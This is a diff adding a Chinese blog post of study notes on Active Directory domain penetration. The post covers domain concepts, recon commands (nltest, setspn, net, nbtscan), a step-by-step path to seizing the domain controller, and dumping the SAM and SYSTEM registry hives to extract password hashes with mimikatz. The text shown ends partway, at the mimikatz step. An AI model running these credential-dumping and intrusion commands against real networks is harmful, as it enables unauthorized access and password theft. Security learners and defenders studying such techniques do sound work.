@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>初始域渗透简略笔记 | $_Fuck | 白天搞笑的废物，晚上抑郁的怪物。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="内网渗透">
+    <meta name="description" content="这篇文章是根据ske师傅的视频写的笔记，视频地址：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av76554533?from&#x3D;search&amp;amp;seid&#x3D;11390449822159779985  写这篇文章只是记录看这个视频的笔记，等哪天有实战环境了会自己出一张更详细的  1、什么是域域英文叫DOMAIN，将网络中多台计算机逻辑组织到一起，进行集中管理，这种区别于环境组的逻">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初始域渗透简略笔记">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;24&#x2F;%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0&#x2F;index.html">
+<meta property="og:site_name" content="$_Fuck">
+<meta property="og:description" content="这篇文章是根据ske师傅的视频写的笔记，视频地址：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av76554533?from&#x3D;search&amp;amp;seid&#x3D;11390449822159779985  写这篇文章只是记录看这个视频的笔记，等哪天有实战环境了会自己出一张更详细的  1、什么是域域英文叫DOMAIN，将网络中多台计算机逻辑组织到一起，进行集中管理，这种区别于环境组的逻">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;s7qidld8ml453m0v6fx1dygn&#x2F;image_1dsneccj2a6a1gu1o0sf141r8v9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;5tendlg3zytc56fis3zy5s2i&#x2F;image_1dsneg3a41k8g1b2479acrh24jm.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;tv7vgpp1il5hl89b6spu07l2&#x2F;image_1dsnek8u4ch3ooncgq16t14lv13.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;ogofuywl5i8ci0oztxzn9r04&#x2F;image_1dsnk16o016a3q3418sf1h4ndif3d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;d5ihihcdvs8joex3o8v1n9vp&#x2F;image_1dsnk09epmean5de8alubinb30.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;90svm7g8yi1oausjr9lsujtq&#x2F;image_1dsnkc0qv147sq4fbql1ca9tmh3q.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;oxb0bi3k8vjj1hng7ca3p6a0&#x2F;image_1dsnkcdvbuts1fq1n361j3h7j747.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;tgnt1i53oj5rkr9tinw7h8tj&#x2F;image_1dsnksgo01se3diqe9eup6nge4k.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;4n6ato1uk8ij0qg3zlejjxnq&#x2F;5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;3dmwvyzt7mwhzd4vv4lgvth9&#x2F;6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;8a4vfpwtq7194mhbdtpkw1uj&#x2F;image_1dsno6nm51q1t1j0m1tan1cvl1565ac.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;6gnfjllydzodio0bobaq57e0&#x2F;7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;gzgvl7ytifo7n96k482ogzjb&#x2F;image_1dsnp3ves9g3d0q12d1ds31kh6b5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;ece0mbngaax6581xdvt7pc6c&#x2F;image_1dsnpq3sf19m21iv21mr9ut31rj7bi.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;uyfodml5nhszptu5mj8su4q3&#x2F;4.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;fnrfth3y08283e97ndo7fqpv&#x2F;5.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;45mjxw3zrenoz7dybwp9z3ll&#x2F;image_1dso1aokaq4in6c1h3cjisk00mn.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;uf2ev4graycnevmlwzf8w29f&#x2F;image_1dsodrk67181t1si02g3ofg1dv19.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;6k6cs2mlawtcfeekrranj3h5&#x2F;image_1dsoe4llnnbsik31s011gaqe91m.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;w0vcl8qirev4f2fy3vhfx8m7&#x2F;image_1dsoecn2dsc316n1u2mosfi7r13.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;6ezmkh24qn3ny9s6dm5b5fo9&#x2F;image_1dsog5sm11go8ndcvcgrd5nbg20.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;iuq1k28ksjnatvi3kavwsung&#x2F;222.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;nqedhvpnf66d3u64ntww6c9j&#x2F;image_1dsqrqqqt11u91j7f1l3q9prdue4i.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;9m5jgrvud0xgzc0nk6jnarl0&#x2F;9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;4jtv3ogmn3pek6m1lw7tpodm&#x2F;image_1dsqtn8bu390qts1v6hauv6b05k.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;vof0v5epueofvddg2vx90v4e&#x2F;image_1dsqtqaj61o9h1c5fp61rnfivt61.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;ewh1m28mv3pcgwsrcvkuregu&#x2F;image_1dsqv7rgcfn9t1fhp1cki1mog6e.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;ikx81g2yu5o6m7rk1jhbytmu&#x2F;3333.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;83m594kmea3w5dhqhxz1oizs&#x2F;image_1dsr14pjr1lovqrh14ha1bg8pgk8n.png">
+<meta property="og:updated_time" content="2019-12-24T04:38:15.327Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;s7qidld8ml453m0v6fx1dygn&#x2F;image_1dsneccj2a6a1gu1o0sf141r8v9.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/blog.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">$_Fuck</h5>
+          <a href="mailto:以凡人之躯比肩神明" target="_blank" rel="noopener" title="以凡人之躯比肩神明" class="mail">以凡人之躯比肩神明</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-address-book"></i>
+                About
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/link"  >
+                <i class="icon icon-lg icon-link"></i>
+                友情链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">初始域渗透简略笔记</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">初始域渗透简略笔记</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-24T04:29:37.000Z" itemprop="datePublished" class="page-time">
+  2019-12-24
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/">兴趣爱好</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container-fluid blog body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、什么是域"><span class="post-toc-number">1.</span> <span class="post-toc-text">1、什么是域</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2、域控（全称域控制器）"><span class="post-toc-number">2.</span> <span class="post-toc-text">2、域控（全称域控制器）</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3、域用户"><span class="post-toc-number">3.</span> <span class="post-toc-text">3、域用户</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4、域管"><span class="post-toc-number">4.</span> <span class="post-toc-text">4、域管</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5、组"><span class="post-toc-number">5.</span> <span class="post-toc-text">5、组</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6、信任域"><span class="post-toc-number">6.</span> <span class="post-toc-text">6、信任域</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#7、域信息收集"><span class="post-toc-number">7.</span> <span class="post-toc-text">7、域信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用nltest查询信用域"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">使用nltest查询信用域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#域信息收集Csvde"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">域信息收集Csvde</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#导出的数据信息"><span class="post-toc-number">7.2.1.</span> <span class="post-toc-text">导出的数据信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查找域内各种服务资源的对应关系setspn"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">查找域内各种服务资源的对应关系setspn</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#dnsdump查找域下名称和IP"><span class="post-toc-number">7.4.</span> <span class="post-toc-text">dnsdump查找域下名称和IP</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#net"><span class="post-toc-number">7.5.</span> <span class="post-toc-text">net</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#扫描内网段的主机信息和域控机"><span class="post-toc-number">7.6.</span> <span class="post-toc-text">扫描内网段的主机信息和域控机</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#域渗透思路"><span class="post-toc-number">8.</span> <span class="post-toc-text">域渗透思路</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#步骤"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">步骤</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注册表读取密码"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">注册表读取密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#lsass读取内存hash"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">lsass读取内存hash</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#读取当前机器各种连接工具密码、浏览器保存的密码等"><span class="post-toc-number">8.4.</span> <span class="post-toc-text">读取当前机器各种连接工具密码、浏览器保存的密码等</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#凭证窃取"><span class="post-toc-number">8.5.</span> <span class="post-toc-text">凭证窃取</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#命令行渗透"><span class="post-toc-number">8.6.</span> <span class="post-toc-text">命令行渗透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#为什么涉及命令行渗透？"><span class="post-toc-number">8.6.1.</span> <span class="post-toc-text">为什么涉及命令行渗透？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#建立ipc连接"><span class="post-toc-number">8.6.2.</span> <span class="post-toc-text">建立ipc连接</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-初始域渗透简略笔记"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">初始域渗透简略笔记</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-24 12:29:37" datetime="2019-12-24T04:29:37.000Z"  itemprop="datePublished">2019-12-24</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/">兴趣爱好</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>这篇文章是根据<code>ske</code>师傅的视频写的笔记，视频地址：<a href="https://www.bilibili.com/video/av76554533?from=search&amp;seid=11390449822159779985" target="_blank" rel="noopener">https://www.bilibili.com/video/av76554533?from=search&amp;seid=11390449822159779985</a></p>
+<blockquote>
+<p>写这篇文章只是记录看这个视频的笔记，等哪天有实战环境了会自己出一张更详细的</p>
+</blockquote>
+<h2 id="1、什么是域"><a href="#1、什么是域" class="headerlink" title="1、什么是域"></a>1、什么是域</h2><p>域英文叫<code>DOMAIN</code>，将网络中多台计算机逻辑组织到一起，进行集中管理，这种区别于环境组的逻辑环境叫做域</p>
+<p>简单来说，假设我的公司有很多个计算机，然后我想设置一些配置，比如修改密码、设置权限等，只需要对域进行操作，就可以直接更改域下面的计算机，就和团队老大一样的意思，在群里艾特全体成员，说你们明天不用上班一样。方便快速，不用一个一个去说。</p>
+<h2 id="2、域控（全称域控制器）"><a href="#2、域控（全称域控制器）" class="headerlink" title="2、域控（全称域控制器）"></a>2、域控（全称域控制器）</h2><p>在一个机器上装上活动目录（存储了有关网络对象信息，并且让管理员和用户能够轻松的查找和使用这些信息。网络对象可以是用户、群组、电脑、网域控制器、邮件、配置文件、组织单元、树系等）后，这个机器就是一个域控服务器</p>
+<p>在一个内网中，可能有很多个域控，他们是没有区分的。</p>
+<p>假设你有三个域控制器<code>a、b、c</code>，那么你在<code>a</code>对用户权限进行修改，那么他会复制到<code>b、c</code>里，如果其中一台域控制器发生故障，其他域控还能正常工作的话，整个域还是可以正常运行的。</p>
+<h2 id="3、域用户"><a href="#3、域用户" class="headerlink" title="3、域用户"></a>3、域用户</h2><p>就是域控制器的用户，域用户的账号密码可以登陆同一域下的任何机器，但是只是普通权限，而非管理员权限。</p>
+<h2 id="4、域管"><a href="#4、域管" class="headerlink" title="4、域管"></a>4、域管</h2><p>可以登陆域控制器上，对一切权限进行控制，域管只需要登陆到域上面进行操作，任何就会应用到域机器，而不用去每台电脑前操作。</p>
+<h2 id="5、组"><a href="#5、组" class="headerlink" title="5、组"></a>5、组</h2><p>将不同用户放入不同的分组里，然后对每个组进行一个权限设置，这样子简单方便的对每一台机器进行权限分配，而不用每个去设置。</p>
+<h2 id="6、信任域"><a href="#6、信任域" class="headerlink" title="6、信任域"></a>6、信任域</h2><p>比如公司下面有子公司，他们都有域，并且处于同一个内网，那么只要子公司的域建立了对母公司的域的信任，那么母公司的域的域用户，就可以登陆到子公司的域，而子公司的域用户不能登陆到母公司的域用户，实战中可能遇到的域不知一个，那么我们可以在当前域查看信任域，然后利用横向渗透登陆到其他域控制器。</p>
+<h2 id="7、域信息收集"><a href="#7、域信息收集" class="headerlink" title="7、域信息收集"></a>7、域信息收集</h2><h3 id="使用nltest查询信用域"><a href="#使用nltest查询信用域" class="headerlink" title="使用nltest查询信用域"></a>使用<code>nltest</code>查询信用域</h3><blockquote>
+<p><code>nltest</code>在<code>03</code>以后系统自带的</p>
+</blockquote>
+<p>信任域：可以在工作组里查询，查询内网是否有域环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">如下命令就可以查找域控IP所有信任域信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:域控IP</span></pre></td></tr></table></figure>
+
+<p>用<code>ipconfig /all</code>就可以查找域控<code>IP</code>，如图</p>
+<p><img src="http://static.zybuluo.com/1kbfree/s7qidld8ml453m0v6fx1dygn/image_1dsneccj2a6a1gu1o0sf141r8v9.png" alt="image_1dsneccj2a6a1gu1o0sf141r8v9.png-76.5kB"></p>
+<p>然后执行<code>nltest</code>后如图</p>
+<p><img src="http://static.zybuluo.com/1kbfree/5tendlg3zytc56fis3zy5s2i/image_1dsneg3a41k8g1b2479acrh24jm.png" alt="image_1dsneg3a41k8g1b2479acrh24jm.png-39.5kB"></p>
+<blockquote>
+<p>可能实战中，信任域环境不仅仅一个</p>
+</blockquote>
+<p>知道信任域名字(<code>HACK</code>)后，可以使用如下命令查找详细的信任域信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">nltest &#x2F;dsgetdc:HACK &#x2F;server:域控IP</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/tv7vgpp1il5hl89b6spu07l2/image_1dsnek8u4ch3ooncgq16t14lv13.png" alt="image_1dsnek8u4ch3ooncgq16t14lv13.png-68.3kB"></p>
+<p>可以用这种办法查找是否存在域环境</p>
+<h3 id="域信息收集Csvde"><a href="#域信息收集Csvde" class="headerlink" title="域信息收集Csvde"></a>域信息收集<code>Csvde</code></h3><blockquote>
+<p><code>Csvde</code>是<code>Window Server 2008</code>的内置命令行工具，位于<code>%windir%/system32</code>文件夹中。</p>
+</blockquote>
+<p>使用如下命令查找<code>HACK</code>这个域的详细信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">csvde -setspn hack -f 导出的地址</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/ogofuywl5i8ci0oztxzn9r04/image_1dsnk16o016a3q3418sf1h4ndif3d.png" alt="image_1dsnk16o016a3q3418sf1h4ndif3d.png-122kB"></p>
+<h4 id="导出的数据信息"><a href="#导出的数据信息" class="headerlink" title="导出的数据信息"></a>导出的数据信息</h4><p><img src="http://static.zybuluo.com/1kbfree/d5ihihcdvs8joex3o8v1n9vp/image_1dsnk09epmean5de8alubinb30.png" alt="image_1dsnk09epmean5de8alubinb30.png-724.4kB"></p>
+<h3 id="查找域内各种服务资源的对应关系setspn"><a href="#查找域内各种服务资源的对应关系setspn" class="headerlink" title="查找域内各种服务资源的对应关系setspn"></a>查找域内各种服务资源的对应关系<code>setspn</code></h3><blockquote>
+<p><code>spn</code>官方名称是服务主体名称，存着的信息是域内的各种服务器的机器名、服务端口号等</p>
+</blockquote>
+<p>如下命令查找<code>HACK</code>域的<code>spn</code>信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">setspn -T hack -Q *&#x2F;*</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/90svm7g8yi1oausjr9lsujtq/image_1dsnkc0qv147sq4fbql1ca9tmh3q.png" alt="image_1dsnkc0qv147sq4fbql1ca9tmh3q.png-164.3kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/oxb0bi3k8vjj1hng7ca3p6a0/image_1dsnkcdvbuts1fq1n361j3h7j747.png" alt="image_1dsnkcdvbuts1fq1n361j3h7j747.png-314kB"></p>
+<p>用处就是，比如护网期间，获取了域控权限，然后我们可以看域内下面的开发的服务，比如<code>mysql</code>，然后使用域用户登录到那台机器，然后连接<code>mysql</code>就可以看到数据，然后提交到获取护网分数。</p>
+<h3 id="dnsdump查找域下名称和IP"><a href="#dnsdump查找域下名称和IP" class="headerlink" title="dnsdump查找域下名称和IP"></a><code>dnsdump</code>查找域下名称和<code>IP</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">dnsdump.exe 域名\域用户 -p 域密码 域控机器名</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/tgnt1i53oj5rkr9tinw7h8tj/image_1dsnksgo01se3diqe9eup6nge4k.png" alt="image_1dsnksgo01se3diqe9eup6nge4k.png-193.7kB"></p>
+<h3 id="net"><a href="#net" class="headerlink" title="net"></a><code>net</code></h3><p>假设我们拿下了一个服务器，他是域用户，那么我们可以使用<code>net</code>命令收集一些信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">net user &#x2F;domain                                获取域用户列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain               获取域管理员列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; &#x2F;domain          查看域控制器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain            查看域机器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain                               查询域里面的组</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/4n6ato1uk8ij0qg3zlejjxnq/5.png" alt="5.png-79.8kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/3dmwvyzt7mwhzd4vv4lgvth9/6.png" alt="6.png-294.8kB"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">net view                                        查看同一域内机器列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">net view \\ip                                   查看某IP共享</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">net view \\GHQ                                  查看GHQ计算机的共享资源列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">net view \\domain                               查看内网存在多少个域</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">net view \\domain:XYZ                           查看XYZ域中的机器列表</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/8a4vfpwtq7194mhbdtpkw1uj/image_1dsno6nm51q1t1j0m1tan1cvl1565ac.png" alt="image_1dsno6nm51q1t1j0m1tan1cvl1565ac.png-269.2kB"></p>
+<h3 id="扫描内网段的主机信息和域控机"><a href="#扫描内网段的主机信息和域控机" class="headerlink" title="扫描内网段的主机信息和域控机"></a>扫描内网段的主机信息和域控机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.52.0&#x2F;24</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/6gnfjllydzodio0bobaq57e0/7.png" alt="7.png-126.5kB"></p>
+<p>图里的<code>DC</code>就是表示这个是域控机器</p>
+<p>如果不存在域的话结果如下</p>
+<p><img src="http://static.zybuluo.com/1kbfree/gzgvl7ytifo7n96k482ogzjb/image_1dsnp3ves9g3d0q12d1ds31kh6b5.png" alt="image_1dsnp3ves9g3d0q12d1ds31kh6b5.png-69.6kB"></p>
+<h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li>横向渗透（拿下内网<code>shell</code>）</li>
+<li>权限维持（以防给管理员发现，然后下线<code>shell</code>）</li>
+<li>取密码（获取一个域用户和账号密码，跑弱口令等等）</li>
+<li>域信息收集（就是第七步所写的，注意那是在跑出域账户和密码情况下并且登陆后才能收集，如果非域权限是禁止执行那些命令的）</li>
+<li>横向渗透（进行域的横向渗透）</li>
+<li>取密码（直到取到域管理员账户密码）</li>
+<li>获取域管权限（使用域管理员账户和密码登陆）</li>
+<li>拿下域控服务器（结局）</li>
+</ol>
+<p><img src="http://static.zybuluo.com/1kbfree/ece0mbngaax6581xdvt7pc6c/image_1dsnpq3sf19m21iv21mr9ut31rj7bi.png" alt="image_1dsnpq3sf19m21iv21mr9ut31rj7bi.png-195kB"></p>
+<h3 id="注册表读取密码"><a href="#注册表读取密码" class="headerlink" title="注册表读取密码"></a>注册表读取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">reg save hklm\system 导出的地址.hiv </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">reg save hklm\sam 导出的地址.hiv</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/uyfodml5nhszptu5mj8su4q3/4.jpg" alt="4.jpg-11.1kB"></p>
+<p>然后就会生成<code>sys.hiv</code>和<code>sam.hiv</code>文件</p>
+<p><img src="http://static.zybuluo.com/1kbfree/fnrfth3y08283e97ndo7fqpv/5.jpg" alt="5.jpg-5.1kB"></p>
+<p>然后使用<code>mimikatz.exe</code>工具读取密码的<code>hash</code>值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:sys.hiv&quot;</span></pre></td></tr></table></figure>
+
+<p>问题1：</p>
+<p><img src="http://static.zybuluo.com/1kbfree/45mjxw3zrenoz7dybwp9z3ll/image_1dso1aokaq4in6c1h3cjisk00mn.png" alt="image_1dso1aokaq4in6c1h3cjisk00mn.png-4.9kB"></p>
+<p>然后跑出的<code>hash</code>放<code>md5</code>网站解密出来就是密码了</p>
